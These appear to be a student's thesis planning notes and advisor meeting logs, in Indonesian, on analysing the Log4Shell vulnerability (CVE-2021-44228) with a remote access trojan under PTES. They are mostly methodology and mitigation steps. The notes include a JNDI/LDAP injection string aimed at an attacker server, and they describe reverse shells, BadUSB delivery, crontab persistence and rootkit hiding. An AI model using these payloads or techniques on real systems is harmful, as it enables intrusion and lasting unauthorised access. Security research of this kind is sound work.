########### 
- pengambilan tema harus urgent -> latbang harus valid bab 1
- solusi bisa diambil dari penelitian / skripsi yang sejenis / berita yang valid
- berita lebih dari 1
- kembangiun rumusan masalah menjawab untuk dikesimpulan
- harus ada objek riset: perusahaan yg tinggi dengan dependency Log4j yang rentan

###########
JUDL: pengembangan -> pengujian ?? -> analisa
	+ ANALISIS KERENTANAN APACHE LOG4J PADA CVE-2021-44228 DENGAN REMOTE ACCESS TROJAN 
	+ ANALISIS KERENTANAN APACHE LOG4J PADA CVE-2021-44228 TERHADAP ANCAMAN REMOTE ACCESS TROJAN	
BAB 1 (MAX 5):
+ latbang / rumusan masalah / tujuan n manfaat
	1. mengukur seberapa jauh eksploitasi dengan ancaman backdoor
	2. seberapa besar pengaruh mitigasi terhadap mengcover kerentanan tersebut ? apakah cukup
+ latbang: tambah diksi kalau orang harus update & apply patch dan bahwa pendekatan mitigasi 
  dari system util dan coding practice itu tidak cukup
+ latbang: berikan contoh social engineering karena kejadian : code injection + usb malware dengan flashdrive
+ latbang: jelasin kerentanannya log4j dibagian apa + sebutkan bentuk reverse + bind shell secara remote
+ latbang: jelasin referensi CVE terhadap kerentanan log4j
+ batasan masalah: tambahin, mitigasi tidak mencangkup pengaplikasian security patch dalam mengukur ketahan mitigasi

BAB 2 (MAX 4):
+ ssl pindahin ke sub bab dalem trojan'
+ smua ringkas jadi lebih padat, jangan takut kehilangan informasi. udah dibackup

BAB 3 (MAX 5):
+ langsung ke inti, kurangin pengertian secara besar
+ 3.1: pendekatan kuantatif, penelitian tindakan (action research: 4 langkah)
+ 3.2: tambahin flowchart dari draw.io
+ 3.3: perbaikin objek penelitian adalah kerentanan Log4j
+ 3.4: framework: PTES
+ 3.5: teknik pengumpulan data: studi pustaka / dokumentasi + eksperimen. analisa data: miles & huberman
+ 3.6: jadwal disesuaikan dgn 3.2

DAFTAR PUSTAKA:
+ ambil referensi apa aja yang dipake beneran + potong sesuai dengan bab 2
+ order

1. perubahan judul & masalah:
	- sebelumnya, judulnya mengenai pengembangan remote access trojan pada log4j, dgn masalahnya itu tentang ancaman post exploitation dan mitigasi terhadap trojan bagi yg gabisa / gamau update security patch nya
	- sekarang, judulnya lebih ke analisis si kerentanan log4j yg mengarah ke ancaman trojan, dan gimana tingkat efektivitas si mitigasinya, diluar dari pengguanaan patch. jadi itu yang salah satunya dikasih tau dari awal di bagian batasan masalah
2. rumusan masalah:
	- bagaimana implementasi si trojan 
	- bagaiamana mitigasinya
	- bisa ditarik ksimpulan untuk gimana keefektifannya stela diuji lagi. jadi seperti before after keamanan
3. tujuan & manfaat:
	- 
###########
- seberapa urgent penelitian karena sudah ada patch baru
- penambahan diksi dan keterangan + pelengkapan review penelitian sebelumnya

###########
- SCRUM, menggunakan kanban board (pembangunan dasar program + integrasi ldap `` badUSB)
	1. Product Backlog ~ peneliti menjabarkan fitur serta komponen yang harus diimplementasi
	   kedalam program sebagai produknya, yang dikemas dalam bentuk user story serta ID nya
	2. Sprint Planning & Sprint Backlog Creation ~ mendeksripsikan apa saja yang harus dikerjakan atau dibuat
	   berdasarkan backlog dalam bentuk suatu sprint, serta perencanaan estimasi dan durasi pengerjaan
	3. Daily Scrum: report progress harian selama pengerjaan sprint
		1. Queue: sprint yang akan dikerjakan
		2. In-Progress: sprint yang sedang dikerjakan
		3. Testing: program akan dilakukan testing (whitebox)
		4. Complete: fitur dianggap selesai apabila testing passed
	4. Sprint Review ~ refleksi dan review dari sprint yang dikerjakan, apa yang kurang dibuatkan dalam sprint baru
- kegiatan dari 4 bisa langsung ke 2 untuk pembentukan sprint backlog dari hasil review
- PTES
	1. Pre-engagement Interaction ~ defisni scope & instrumen pengujian
	2. Information Gathering ~ pengumpulan kelengkapan data dari dokumentasi dan studi pustaka secara pasif
	3. Threat Modelling ~ perancangan attack vector denngan dua pendekatan code injection
	   hands-on-keyboard attack & badUSB, untuk penyisipan trojan, dengan goals utama yaitu dapaat me-remote access target
	4. Vulner Analysis ~ analisis kerentanan dengan referensi CVE dan kalkulasi CVSS yang diadaptasi dari attack vector
	5. Exploitation ~ tahap pengujian sistem dengan serangan code injection
	6. Post Exploitation ~ pengembangan pengujian dengan remote access trojan untuk maintain access
	7. Reporting ~ penerapan mitigasi serta analisis keefektifannya dengan
	   melakukan tahap 5 & 6 pra-mitigasi yang kemudian dikemas dalam laporan
  
- proses dari awal, mulai dari input, lalu kamu analisis secara besar, dan outputnya analisanya penjabaran PTES
- perubahan judul + tambahin metode analisis 
- analisis menggunakan evaluation matrix 
  
- Input : pengumpulan data analisis kerentanan dan penyusunan vektor
- Proses : exploit post exploit mitigasi exploit post exploit
- Output : evaluation matrix untuk dianalisa  
  
- Input : analisis kerentanan dan penyusunan vektor
- Proses : exploit post exploit mitigasi exploit post exploit
- Output : evaluation matrix untuk dianalisa  
  
###########
+. Rangkum bab 2 ampe 4 hal max
+. Benerin format dafput kaya bang is
+. tambahin versi terbaru
+. Tambahin penjelasan metodologi scrum n ptes di 3.2
+. Jelasin input ouput penelitian dan analisa secara besar. Dalem paragrap 3.2
+. Rapihin format bahasa
+  Dafsi
+  Abstrak
+  Scan formulir
+. Cross Check Proposal
5. Ppt
5. Setiap tahapan ada referensi orang / pendapat ahli
6. Bahan baca ppt
7. Daftar
  
###########
judul
ANALISIS KERENTANAN APACHE LOG4J PADA CVE-2021-44228 TERHADAP ANCAMAN REMOTE ACCESS TROJAN DENGAN METODE PENETRATION TESTING EXECUTION STANDARD


abstraksi
Dalam era kini, peningkatan terhadap ancaman serangan siber semakin berkembang, terutama dalam lingkup industri. Salah satu kasus ancaman siber yang muncul pada akhir November 2021 adalah Log4Shell, istilah kerentanan produk Log4j. Hal ini dikonfirmasi oleh Oracle, perusahaan pengembang Log4j, menjelaskan bahwa kerentanan CVE-2021-44228 membolehkan penyerang untuk mengontrol sistem client dengan memanipulasi fungsi logging melalui fitur JNDI lookup Log4j, untuk menjalankan payload Java yang nantinya akan membangun remote connection tanpa autentikasi. Pengembangan kerentanannya yang relatif cepat memberikan resiko yang tinggi terhadap perusahaan secara global, karena tingginya penggunaan Log4j dalam berbagai tingkat platform. Dalam rangka untuk mendalami fenomena tersebut, peneliti berupaya untuk menganalisa kerentanan Log4j pada CVE-2021-44228 terhadap pengembangan eksploitasinya. Hal ini dilakukan dengan melakukan pengujian pada ancaman remote access trojan dalam bentuk persistence backdoor yang berbasiskan pada model PTES (Penetration Testing Execution Standard). Pengujian dilakukan dengan code injection pada dua macam attack vector, hands-on-keyboard dan bad-USB, serta memaintain access nya dengan penggunaan backdoor. Adapun mitigasi yang diadaptasikan merujuk kepada pendekatan static analysis serta pemanfaatan system utility dalam meminimalisir ancaman tersebut. Ketahanan mitigasi ini yang kemudian menjadi tolak ukur untuk dianalisa seberapa luas dan efektifnya pendekatan tersebut. 
`
static analysis ~ coding + internal config
system utility ~ unhide + netstat + iptables ++
data : proof of concept

setiap tahapan ada referensi orang / pendapat ahli
--
+. Latar Belakang
+. Rumusan Masalah
+. Tujuan dan Manfaat
+. Batasan 
+. Matriks penelitian terdahulu
+. Teori penunjang & hubungannya dengan skripsi
+. Diagram alir penelitian
+. Penjelasan PTES
+. Timeline

###########
- 1 MILLION DOLLAR QUESTION !!!!
  q: kan sudah ada patch updatenya, ngapain kmu teliti lagi? urgensinya apa ?
  a: ada beberapa hal kenapa saya masih di CVE-2021-44228
	- cuman ini bukan sebagai kerentanan biasa pak, walaupun sudah di patch. cuman ini salah satu fenomena cyber paling besar per november. dan saya pun ikutin beritanya dari desember kemarin
	- dokumentasi untuk pengambilan data sudah relatif banyak yang sudah valid, penelitianya / tesis belum ada (sinta, research gate, taylor francis, sciencedirect)
	- bisa sebagai pijakan untuk pengembangan penelitian untuk kedepan
	- dan bisa dilanjutkan kalau dokumentasi dan pengambilan datanya sudah cukup banyak terkait referensi kerentanan yang terbaru, karena per sekarang dokumentasinya masih minim (arsitektur, outputnya, attack vectornya)
	- jadi saya kira saya bisa plejarain data dan dokumentasi untuk ngembangin masalah, ngembangin ancaman yang memang bisa diselesaikan pak

- evaluation matrix ambil dari attack tree
- reverse shell pakai openssl
- web server java dijadiin bentuk post exploitation : dijadiin service standalone dan nyalain terus lewat crontab
- analisa non parametik cochran
- desktop environmet GNOME testing
- skripsi ini sebagai menambah PoC terkait kerentanan dan potensinya
- kerentanan Log4j tidak hanya berefek pada sisi client, namun bisa dimanfaatkan oleh attacker sebagai salah satu attack vector berupa service reliable
- semua file konfigurasi diakses secara remote, tidak hardocded. jadi sangat modular
- post exploit ga perlu sampe dapet root, cukup jalanin java-http lewat crontab

- kenapa ga exploit sampe root
	1. untuk sampai root, analisisnya bisa keluar dari lingkup penelitian, yang dari kerentanan log4j menjadi level kerentanan sistem. karena rootkit bisa dimanfaatin mulai dari versi dependensi library dan kernel nya
	2. jadi seluruh tools  dan script saya usahaain untuk mengandalkan program atau command general dan yang sudah built in ke dalem OS, jadi tidak mendalam apa sistem ini harus kernel versi sekian dll

- kan ini kasus tahun kemarin, apakah masi relevan?

- 2 BENTUK ATTACK VECTOR :
	1. H-O-K: mengandalkan adanya kerentanan log4shell dari aplikasi client (hands-on-keyboard)
	2. B.USB: kita menggunakan kerentanan log4shell sebagai server khusus untuk dieksploit untuk di tanem (bad usb)

- pengujian :
	1. Java 1.8.0_181 // 1.8.0_333 // 
	2. Log4j 2.14.1 // 2.15.0 // 2.16.0 // 2.17.0

- saran : 
	1. ada dynamic port selection + enkripsi komunikasi payload
	2. penggunaan risk assessment seperti SSVC yang lebih spesifik merujuk untuk whitebox testing
	3. hiding process / port service mengunakan rootkit dapat membuat backdoor menjadi lebih persistent

- deteksi :
	1. Show process: ps / htop / unhide
	2. Show active connections (netstat)
	3.

- mitigasi : ${jndi:ldap://192.168.1.6:2038/cn=1807422020,dc=attacker,dc=com}
	1. Java
		- Java 1.8.0_181
			1. 	System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
		- upgrade Java 1.8.0_321
	2. Log4j tapi GUI Client masi bisa dipakai dengan aman
		- upgrade 2.17.0
			*. no LDAP protocol connection support for JNDI Log4j Lookup
		- upgrade 2.16.0
			*. NO message subtitution + JNDI Log4j Lookup disabled implicitly
		- upgrade 2.15.0
			*. message subtitution OK + JNDI Log4j Lookup only localhost	
			1. appender.rolling.layout.pattern = [%d{dd/MM/yy HH:mm:ss}] (%-5p) %m{nolookups}%n
			2. System.setProperty("log4j2.enableJndiLookup", "false"); 
			3. remove JndiLookup class from log4j-core.jar			
		- stick 2.14.1 
			*. message subtitution OK + remote JNDI Log4j Lookup
			1. appender.rolling.layout.pattern = [%d{dd/MM/yy HH:mm:ss}] (%-5p) %m{nolookups}%n
			2. System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
			3. remove JndiLookup class from log4j-core.jar
				- cd ~/.m2/repository/org/apache/logging/log4j/log4j-core/2.14.1
				- jar -xvf log4j-core-2.14.1.jar
				- rm org/apache/logging/log4j/core/lookup/JndiLookup.class
				- jar -cvf log4j-core-2.14.1.jar Log4j-config.xsd Log4j-events.dtd Log4j-events.dtd Log4j-levels.xsd META-INF/ org/
				
	2. Sanitasi Input User (GUI client) & Sanitasi sebelum di Log
		- sanitasi input user, deteksi protokol, URL, dll
	3. Log4j Properties
		- log pada level tertentu (FATAL)
	3. Firewall (iptables)
		- sudo iptables -A OUTPUT -s 192.168.1.13 -p tcp --source-port [port] -j DROP
		- sudo iptables -A OUTPUT -s 192.168.1.13 -p tcp -j DROP
	4. Kill Process
	5. Crontab
	6. Block specific app
	7. 

- analisis
	1. tingkat hasil pengujian alpha testing
	2. tingkat keberhasilan pengujian sesudah dan sebelum mitigasi (evaluation matrix)
	3. kondisi sistem pengguna : sebelum diserang, diserang, diamanin + diserang
	  	+ CPU Utilization : htop (4 core 7 & Load Average)
	  	+ CPU Time Consumption : atop
	  	+ Memory Occupation : atop
	  	+ Network Utilization : atop (wlp2s0), linux-dash, stacer (download upload bitrate), iptraf (packet)
	  	+ Disk Read  : iotop
	  	+ Disk Write : iotop
	  	+ User's Activity : psacct & acct, last

- tipe tipe pengambilan data penelitian
	- sekunder :
	- 
	
1 ########### 8/3/22 gmeet
- report progress pengerjaan
- selesai test koneksi LDAP server, sedang bangun sisi client untuk nantinya diintegrasi
- target 2 minggu ini sudah dapat komunikasi utk sisi login client

2 ########### 22/3/22 gmeet
- report progress pengerjaan
- kalau secara besarnya untuk client-server nya udah selesai
- kemarin malem untuk client nya udah keintegrasi sama log4j. versi yang dipake jadinya 14.1, versi terakir yg kena kerentanan ini
- malem lagi mau perbaikin bug sama lanjut masukin semua aksi untuk di logging
- targetnya minggu ini mau pelajarin si kerentanannya dulu cara kerjanya gimana

3 ########### 19/4/22 email
- report progress pengerjaan
- perancangan build client + log4j sudah selesai
- mulaai coba testing untuk jalanin remote payload
- membuat ulang laporan skripsi bab 1-2

4 ########### 25/4/22 email
- report progress pengerjaan
- selesai perancangan & testing server ldap attacker sebagai penyimpanan objek payload
- sedang merancang bash script untuk meng handle remote shell
- selanjutnya mencoba membuat si payload itu sendiri dalam bahasa java + di test

5 ########### 29/4/22 gmeet
- report progress pengerjaan
- script handler koneksi remote nya sudah selesai
- payload java nya sudah ditesting juga dan suda bisa, baik itu bind shell maupun reverse shell.
- beberapa parameter payload nya diambil dari web si penyerang, jadi tidak hardcoded biar flexibel
- hari ini niatnya mau testing si payload lewat log4j di aplikasi client, jadi testing utamanya disini
- biar ada waktu utk perbaikan kalo misalkan error.
- sebelum uas bisa nyicil bab 3, itu sala satu tugas dri matkul metedologi penelitian

6 ########### 21/5/22 email
- report progress pengerjaan
- payload akhirnya berhasil jalan untuk remote code execution di log4j
- sudah testing untuk kerentananya di 4 versi java setelah patch untuk RCE
- progres di bab 3,2
- migrasi dari vbox ke docker karena resource free

7 ########### 24/5/22 gmeet
- report progress pengerjaan
- sudah selesai migrasi untuk vm vm nya ke docker dan uda berhasil di testing juga serangannya
- lalu kan saya ada 2 attack vector nanti, yang hands-on-keyboard sama pakai usb malware, cuman karna aplikasi yang dibuat bentuk gui desktop, yang usb malware jadi masi bingung cara serangnya gimana. 
- hari ini saya  mau sempetin buat bikin web server yang vulnerable untuk di sisi penyerang. jadi kalau usb malware nya diinsert di laptop korban, usb bakal otomatis buat http request ke web server penyerang untuk nge exploit si log4j nya web server
- jadi serangannya lebi ringan dan ga perlu interaksi korban buat ngetik misalkan, seperti di aplikasi gui
- kalau word target akhir bulan sudah selesai bab 3 terkait perancangan dan implementasi. jadi kalau yang web server udah berhasil, bisa langsung didokumentasiin ke word
- jangan tulis yg kmu ga ngerti, yg bisa slamet: play safe but play hard

8 ########### 21/6/22 gmeet
- report progress pengerjaan
- java http server nya sudah selesai ditesting dengan payload lewat custom header. untuk jalaninnya lewat curl pakai response json, untuk ngeliat headernya diproses atau tidak di log4j nya server. dan server ini yg tadinya mau saya tanem di usb malware itu
- untuk attack vector usb malware tidak saya lanjutkan pak jadinya, karna stela saya dalemi lagi pilihanya itu antara cari chip dari usb nya harus rentan juga, seperti model transcend yg lama, atau pakai microcontroller sendiri seperti arduino
- jadi biar fokus waktu, saya sempitin untuk satu attack vector aja, yg hands-on-keyboard, dan server yg tadinya untuk usb malware saya pakai di post exploit sebagai hidden service tersendiri
- ada update juga untuk reverse shell nya karna yang lama nda stabil kalau dijalanin di background, jadinya ga mau nerima input remote lagi. dan itu udah fix + suda support ssl juga 
- jadi untuk alat uji sudah selesai semua
- / outline bab 3 dan bab 4 juga kurang lebih suda selesai, biar kegambar tiap sub bab mau ngapain aja
- jadi skarang saya lagi kuatin untuk parameter parameter pengujian dan analisis data nya dari paper orang, jadi bisa mulai fokus ke penulisan word nya sekarang
- attack vector tetep harus nambah satu lagi, agar tidak downgrade dari yg di proposal. attack vector boleh diganti
	1. hands-on-keyboard attack
	2. embedded file payload

9 ########### 01/7/22 gmail
- report progress pengerjaan
- terkait penambahan attack vector, saya jadinya pakai bad usb lagi pak, alhamdulillah sudah beli alatnya, jadi sembari belajar dasar arduino. tadinya saya mau pakai attack vector yang payloadnya berupa embedded (.mp4, .mp3, .mov)
- cuman attack vector kaya gitu butuh media player yg sama sama rentan juga. jadinya lebih efisien pakai bad usb
- untuk semua tools nya sudah di testing tadi sore dan lancar, untuk kedua attack vector dari sisi client dan attacker
- saya mulai bisa fokus rapihin bab 2 & perbaikin outline bab 3 & 4 karena ada revisi di panduan skripsi yang baru

10 ########### 03/7/22 gmeet
- report progress pengerjaan
- lagi update format. skarang pindah pake libreoffice untuk word nya, jadi kmaren cuman nyesuain setting aja
- target nya malem ni bisa rangkum lagi bab 2, 
- jadi bisa lengkapin yang belum belum : bab uml diagram, bad usb, sama bagian software testing

11 ########### 13/7/22 gmeet
- report progress pengerjaan
- kelarin bab 1 suda selesai revisi ulang
- saya beberapa hari yg lalu dalemin lagi untuk cara information gathering dalem scope whitebox testing di aplikasi Java. karena aga beda kalau targetnya web / service
  -> jadinya dapat 2 utama dulu, itu OWASP Dependency Check dan OSS Index. dan database nya sudah update untuk referensi kerentanan Log4j yang saya pake
- properties saya bikinin ke API biar lebih modular
- dari kemarin saya benerin utk tools bad usb nya dulu, karena ga konsisten eksekusinya. gataunya isu nya di waktu delay antara download payload dan jalaninnya, kadang kecepetan kadang kelambatan, jadinya ga sinkron, mungkin karena pengaruh internet juga. 
- jadi semua command saya taro di bashscript biar gampang control nya, trus saya encoding base64 biar script nya jadi satu baris langsung kelar. itu baru solve tadi pagi
- kalau hari ini lagi mau import semua bab 2 lagi dr dok yang lama

12 ########### 22/08/22 email
- untuk skema pengujian tools dan ancaman RAT nya sudah selesai
- mitigasi sekarang ada analisa tentang solusi yang didapet dan cara maksimalin keamanan kalau upgrade ke versi Log4j (2.15.0, 2.16.0 & 2.17.0)
- per sekarang saya di bab 4.2.1, terkait perancangan & implementasi sistem, baik untuk sisi pengguna dan penyerang
- saya sedang kejar utk pembuatan UML diagram yang dibutuhin dahulu (activity diagram & class diagram) yang dipake di bab 4.2, jadinya tinggal susun ke paragraf nanti
- kalau sudah nanti langsung ke bab 4.3 utk pengujian sistem

13 ########### 15/12/22 email + meet
- submisi lapooran skripsi untuk revisi
	1. activity diagram: masuk aplikasi >> tampilin login
	2. activity diagram: properties >> endpoint == GET >> menerima response 
	3. menerima > nambah data > 
	4. layanan HTTP java
	5. apa yang kamu lakuin, sistem ngerespon nya gimana
	6. gaperlu pake partisi, langsung aja pengguna / penyerang

14 ########### 23/12/22 kampus
- revisi activity diagram untuk menyesuaikan konsep kerja dari aplikasi yang lebih padat dan jelas 
- isi dari dependensi log4j \\ bbab 2
- oprek log4j, jangan fokusin ke firewall dulu, mitigasi firewall untuk vektor serangan badusb
- bab 4,1 implementasi sistem aplikasi yang rentan, library di integrasi

- flowchart
- input, library log4j jelasin secara umum, integrasi log4j ke aplikasi
- proses, hapus jndilookupclass
- output, mitigasi

15 ######## 2/1/23 email + meet
1. menjelaskan kembali apa itu Log4j, dan hubungan dengan JNDI (hal. 7)
2. menjelaskan tahapan penelitian melalui flowchart, awal hingga akhir (hal. 19)
3. update act. diagram pada halaman login (hal. 26)
4. update act. diagram untuk terima HTTP method response (hal. 34, 35)
5. update act. diagram tambah node injeksi badusb untuk men-trigger layanan (hal. 37)
6. menerangkan apa yang dilakukan saat implementasi mitigasi (primer > sekunder) (hal. 56)
7. buat data analisa pengujian untuk vektor serangan HoK (hal. 63)
8. menjelaskan fase I, II dan III pada paparan data pengujian (hal. 63)

16. ####### 2/1/23 email
1. act. pengguna >> melihat data profil [--]
2. masukin fase 1,2,3 di dalam diagram  [OK]

###########
Relasi Class Diagram
- aggregation, a  subset from association (part-whole) relationship, where the child is independent \ standalone from its parent, and can be used to other instaces
- 

ANALISIS KERENTANAN APACHE LOG4J PADA CVE-2021-44228 TERHADAP ANCAMAN REMOTE ACCESS TROJAN DENGAN METODE PENETRATION TESTING EXECUTION STANDARD 

##########################################
logo
----
opacity: 15
scale: 50%
page: 3
horizontal dist: 0.5 cm
behind page

border copyright
----------------
rotation: -90
scale: 100%
page: 3
horizontal from: left
behind page

A4
8,27 inc x 11,69